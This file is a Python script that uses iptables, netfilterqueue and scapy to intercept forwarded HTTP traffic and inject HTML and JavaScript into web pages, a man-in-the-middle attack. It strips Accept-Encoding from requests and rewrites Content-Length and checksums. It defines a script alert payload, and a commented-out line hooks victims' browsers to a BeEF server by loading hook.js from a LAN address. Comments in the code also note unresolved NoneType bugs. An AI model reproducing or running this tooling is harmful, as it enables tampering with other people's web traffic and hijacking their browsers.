#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import sys
import argparse
import subprocess
from scapy.layers import http
#from scapy.layers.http import *
import re
import zlib
import linecache

# stolen from here: https://stackoverflow.com/questions/14519177/python-exception-handling-line-number

def PrintException(*args):
	exc_type, exc_obj, tb = sys.exc_info()
	f = tb.tb_frame
	lineno = tb.tb_lineno
	filename = f.f_code.co_filename
	linecache.checkcache(filename)
	line = linecache.getline(filename, lineno, f.f_globals)
	if args:
		print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ problem here ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
		print(args)
	print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


def run():
	#subprocess.call(["clear"])
	print "&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&"
	set_iptables()
	create_queue()
	 

def create_queue():
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(1, intercept_packets)
	try:
		queue.run()
	except KeyboardInterrupt:
		print("[+] CTRL + C detected, resetting iptables")
		reset_iptables()
		sys.exit(0)


def set_iptables():
	subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


def reset_iptables():
	subprocess.call(["iptables", "--flush"])


def intercept_packets(packet):

	
	#target_host = "tachibanalaboratories"
	#alert_message = "you have been pwned"
	payload = "<body><script>alert(\'you have been pwned\');</script>"

	scapy_packet = scapy.IP(packet.get_payload())
	
	try:
		if (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(http.HTTPRequest)):
			
			if scapy_packet[scapy.TCP].dport == 80:
				new_packet = set_http_request_header(scapy_packet)
				packet_fragment_list = scapy.fragment(new_packet)
				forward_packet(packet_fragment_list, packet)

		elif (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw)):
			
			load = scapy_packet[scapy.Raw].load

			if ((scapy_packet[scapy.TCP].sport == 80) and (scapy_packet is not None) and (load is not None)):
				new_packet = set_response_headers_and_load(scapy_packet, load, payload) # SOMETHING GOING WRONG HERE CAUSING NONETYPE
				packet_fragment_list = scapy.fragment(new_packet) # 'NoneType' object is not iterable
				forward_packet(packet_fragment_list, packet)

		else:
			packet.accept()
	except:
		PrintException()
	#packet.accept()

def forward_packet(fragment_list, packet):
	for index, packet_fragment in enumerate(fragment_list):
		print("fragment", index, "##############################################")
		scapy.send(packet_fragment)
	packet.drop()



def set_response_header_value_content_length(packet, payload):
	try:
		payload_length  = len(payload)
		content_length =  packet[http.HTTPResponse].Content_Length

		if content_length is not None:
			print "Content length not None", content_length
			new_content_length = int(content_length) + payload_length # int() argument must be a string or a number, not 'NoneType'
			del packet[http.HTTPResponse].Content_Length
			packet[http.HTTPResponse].Content_Length = new_content_length
		elif content_length is None:
			print "Content length None", content_length
			new_content_length = payload_length
			packet[http.HTTPResponse].Content_Length = new_content_length
		else:
			print("something strange happened")
	except:
		PrintException()
	return packet


def set_response_headers_and_load(packet, load, payload):

	try:
		#payload = "<body>look at you stacy, pathetic creature of flesh and bone, panting and sweating as you run through chad's corridors<script src=\"http://192.168.1.103:3000/hook.js\"></script>" #hooks target browser to BeEF
		payload = "<body>you have been bongizuka'd"
		packet = set_response_header_value_content_length(packet, payload)

		#inject payload into raw layer
		#print("Initial load", load)
		#print("payload", payload)

		new_load = load.replace("<body>", payload)
		#print(type(load))
		#print("Final load", new_load)
		packet[scapy.Raw].load = new_load # 'NoneType' object has no attribute '__getitem__'
		#packet.show()
		#print ("Raw load", packet[scapy.Raw].load)
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum

	except AttributeError:
		PrintException()
	return packet

def set_http_request_header(packet):
	packet[http.HTTPRequest].Accept_Encoding = ""
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet
	
run()
